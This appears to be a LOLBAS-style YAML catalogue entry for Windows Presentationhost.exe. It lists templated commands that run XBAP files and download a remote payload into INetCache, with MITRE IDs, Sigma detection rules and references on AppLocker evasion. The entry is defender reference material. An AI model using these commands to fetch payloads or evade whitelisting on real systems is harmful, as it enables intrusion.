---
Name: Presentationhost.exe
Description: File is used for executing Browser applications
Author: Oddvar Moe
Created: 2018-05-25
Commands:
  - Command: Presentationhost.exe {PATH_ABSOLUTE:.xbap}
    Description: Executes the target XAML Browser Application (XBAP) file
    Usecase: Execute code within XBAP files
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
    Tags:
      - Execute: XBAP
  - Command: Presentationhost.exe {REMOTEURL}
    Description: It will download a remote payload and place it in INetCache.
    Usecase: Downloads payload from remote server
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
    Tags:
      - Download: INetCache
Full_Path:
  - Path: C:\Windows\System32\Presentationhost.exe
  - Path: C:\Windows\SysWOW64\Presentationhost.exe
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml
  - IOC: Execution of .xbap files may not be common on production workstations
Resources:
  - Link: https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
  - Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
  - Person: Nir Chako (Pentera)
    Handle: '@C_h4ck_0'
---
